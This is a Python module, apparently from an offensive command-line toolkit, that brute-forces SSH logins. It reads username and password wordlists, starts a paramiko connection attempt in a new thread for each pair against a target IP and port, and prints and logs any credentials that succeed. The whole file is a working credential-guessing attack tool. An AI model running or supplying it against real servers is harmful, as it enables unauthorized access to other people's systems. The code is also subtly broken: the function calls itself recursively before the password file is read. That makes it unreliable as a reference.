import os
import sys
import paramiko
import time
import argparse
import logging
import threading
from utilities import *


def ssh_bruteforce():
    choice = 1000
    sys_arg_cleaner()
    while (choice != "exit"):
        print("type 'exit' to go back.")
        print("""-h or --help for help""")
        print("\033[4mktool\033[0m" + "> ", end="")
        arguments = input()
        if (arguments == "exit"):
            return False

        sys.argv += arguments.split()

        try:
            parser = argparse.ArgumentParser(exit_on_error=False, usage="-t TARGET -p PORT -u USERNAMES -w PASSWORDS")
            parser.add_argument("-t", "--target", help="Target IP address", required=True)
            parser.add_argument("-p", "--port", help="Target port", required=True)
            parser.add_argument("-u", "--usernames", help="Usernames file", required=True)
            parser.add_argument("-w", "--passwords", help="Passwords file", required=True)
            args = parser.parse_args()
        except argparse.ArgumentTypeError as e:
            print(e)
            return True
        except argparse.ArgumentError as e:
            print(e)
            return True
        except:
            time.sleep(0.1)
            return True

        try:
            args.usernames = os.path.abspath(args.usernames)
            args.passwords = os.path.abspath(args.passwords)
            with open(args.usernames) as f:
                usernames = f.read().splitlines()
            ssh_bruteforce()
            with open(args.passwords) as f:
                passwords = f.read().splitlines()

        except Exception as e:
            #print("the specified usernames/passwords file doesn't exist")
            print(e)
            return True

        def try_login(username, password):
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(args.target, port=args.port, username=username, password=password)
                print(f"[+] Login Successful! {username}:{password}")
                logging.info(f"[+] Login Successful! {username}:{password}")
                ssh.close()
            except paramiko.ssh_exception.AuthenticationException:
                print(f"[-] Login Failed! {username}:{password}")
            except paramiko.ssh_exception.SSHException as e:
                print("An error has occured : ", e)
                pass

        for username in usernames:
            for password in passwords:
                t = threading.Thread(target=try_login, args=(username, password))
                t.start()

    return True
